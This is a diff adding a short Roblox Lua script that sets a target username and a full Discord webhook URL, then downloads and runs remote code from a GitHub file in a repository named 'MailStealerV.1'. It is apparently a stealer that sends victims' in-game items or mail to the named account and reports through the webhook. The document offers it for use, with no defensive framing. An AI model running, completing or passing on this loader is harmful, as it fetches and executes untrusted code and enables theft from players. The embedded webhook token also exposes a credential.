@@ -1,0 +1,4 @@
+```Username = "Thyuyus"
+Webhook = "https://discord.com/api/webhooks/1214407062306557972/okkm97sWROHUev0cX6TYzFrePaJaWscxA4D1h0Bhf86C_ZTBWeMdr5RruEOw4F-aPqck"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CatZHubOffical/MailStealerV.1/main/V.2"))()```
